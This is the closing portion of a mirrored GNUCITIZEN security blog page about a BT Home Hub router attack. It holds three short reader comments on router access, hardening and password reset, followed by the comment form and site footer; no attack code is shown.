+		<p>This all seems pointless, tell me i&#8217;m wrong. How can you run any of this unless your on the network? I am surrounded by at least 10 hubs and need to access one of them??</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-128546">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/5d9a19e6b9d73f74767d5b75e667d708?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">JC</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128546">
+			June 9, 2010 at 7:39 pm</a>		</div>
+
+		<p>The first thing I do with any router is to change its ip address and the range of ips that the lan users can use and turn of dhcp. This would mean your script would have in theory to cover the whole range of private ip addresses from the Wan side and make access from the lan side much more difficult</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-128841">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a824e5156fe092b2b4a5fbfc6ed0ce8c?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">bobp</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-128841">
+			September 1, 2010 at 10:57 am</a>		</div>
+
+		<p>Is there any way to reset admin password, other than doing factory reset of router?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="537"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="593d19315c" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/bt-home-flub-pwnin-the-bt-home-hub-4/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:59:04 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
